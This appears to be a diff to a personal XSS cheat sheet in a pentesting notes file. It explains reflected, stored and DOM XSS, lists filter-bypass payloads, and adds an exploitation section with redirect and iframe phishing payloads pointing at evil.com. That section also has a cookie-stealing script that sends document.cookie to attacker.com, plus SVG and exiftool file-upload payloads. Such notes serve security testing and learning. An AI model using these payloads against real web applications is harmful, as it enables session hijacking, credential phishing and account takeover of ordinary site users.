@@ -1,5 +1,98 @@
 # xss
 
+What is XSS?:
+
+When an attacker can trick the web application to insert an arbitrary Javascript code and execute it, the attack is known as Cross Site Scripting or XSS in short.
+
+
+
+Types of XSS:
+
+Reflected XSS: Input gets reflected on the page
+
+Stored XSS: Input gets stored in the server
+
+DOM XSS: Input gets stored in the DOM i.e goes from the source and gets out from the sink
+
+
+
+How XSS works?
+
+Attacker sends a link to the victim
+
+Victim authenticates with the server
+
+Attacker gets the cookie
+
+
+
+Reflected XSS Method
+
+Check for input if it gets reflected in Page Source, Body or URL
+
+If input gets reflected we can hunt for RXSS
+
+Send a simple alert box to execute and prove XSS
+
+It happens due to no proper validation or sanitization of inputs
+
+
+
+XSS Payloads:
+A list of XSS Payloads can be downloaded from : https://github.com/payloadbox/xss-payload-list
+
+
+
+Balancing:
+
+Sometimes the payload gets injected in between certain tags and hence cannot get executed. Inorder for it to get executed we need to break the tag out.This is called as balancing.
+
+
+
+Limited Input’s:
+
+Sometimes <script> tags are blocked then we can use payloads such as <img src=x onerror=confirm(1)>
+
+
+
+Sometimes alert(1) are also stripped out in such a case prompt and confirm can be used
+
+
+
+XSS in User Agents:
+
+Sometimes XSS can be performed via User-Agents.One such header is Referer. If the value gets reflected in the response, then RXSS can be performed.
+
+
+
+XSS in Caching Server Attack:
+
+In some web applications we attack using User Agents. Then we save our payload into Caching Server.Whenever anyone visits the url is cached and will lead to XSS.This will remain until cache is flushed.
+
+
+
+
+
+XSS in Emails:
+
+Some web applications have the email field vulnerable to XSS. We create the payload according to the RFC822 email address validator and prompt the famous alert box!
+
+The email validator can be found : http://sphinx.mythic-beasts.com/~pdw/cgi-bin/emailvalidate
+
+
+
+XSS Bypass Protection:
+
+The following methods can bypass XSS Protection on a web server:
+
+Encoding the Payload using encoding techniques like Base64
+
+Sometimes web application block “(Double quotes) but a payload like ‘-alert(1)-’ can bypass the protection giving Reflected XSS
+
+
+
+https://github.com/devanshbatham/ParamSpider
+
 Payloads: 
 
 **Basic payload 
@@ -72,6 +165,31 @@ location.pathname
 
 XSS exploitation:
 
-phishing : <script>doument.location.href="http://evil.com"</script>
+URL redirection  payload: 
+<script>doument.location.href="http://evil.com"</script>
+<a href="http://evil.com">Login Here</a>
+
+Phishing Payloads:
+
+<iframe src="https://evil.com" height="100%" width="100%">
+
+Cookie stealing:
+<script>alert(document.cookie)</script>
+
+<script>document.location.href="http://attacker.com/cookie"+document.cookie</script>      (we can also start a python -m SimpleHTTPServer 8080 )
+
+
+XSS USING FILE UPLOADS :
+Type 1 :
+1. create a .svg file with the following content in the file :  <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
+2. Navigate to the file path, BOOM XXS .
+
+Type 2:
+1. Download a exif based image
+2. Go to terminal and type : exiftool -Artist='"> <img src=x onerror=alert(1)>' filename(image_name)
+
+
+
+
  
  
